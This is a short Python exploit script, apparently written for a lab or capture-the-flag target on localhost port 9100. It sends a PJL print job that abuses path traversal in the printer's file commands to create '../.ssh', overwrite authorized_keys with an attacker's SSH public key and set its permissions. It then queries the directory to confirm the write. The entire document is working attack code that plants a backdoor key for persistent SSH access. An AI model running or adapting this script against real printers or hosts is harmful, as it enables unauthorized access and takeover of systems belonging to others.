#!/usr/bin/env python3
import socket

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
UEL = b"\x1b%-12345X"
PATH = "../.ssh/authorized_keys"
N = len(KEY)

job = (
    UEL
    + b"@PJL JOB NAME=upload\r\n"
    + f'@PJL FSMKDIR NAME="../.ssh"\r\n'.encode()
    + f'@PJL FSDELETE NAME="{PATH}"\r\n'.encode()
    + f'@PJL FSAPPEND NAME="{PATH}" SIZE={N}\r\n'.encode()
    + KEY
    + f'@PJL FSCHMOD NAME="../.ssh" MODE=700\r\n'.encode()
    + f'@PJL FSCHMOD NAME="{PATH}" MODE=600\r\n'.encode()
    + b"@PJL EOJ\r\n"
    + UEL
)

s = socket.socket()
s.settimeout(12)
s.connect(("127.0.0.1", 9100))
s.sendall(job)
out = b""
try:
    while True:
        out += s.recv(4096)
except socket.timeout:
    pass
s.close()
print("job_out", repr(out[:300]))

s = socket.socket()
s.settimeout(5)
s.connect(("127.0.0.1", 9100))
s.sendall(b'@PJL FSQUERY NAME="../.ssh"\r\n')
print("Q", s.recv(1024))
s.close()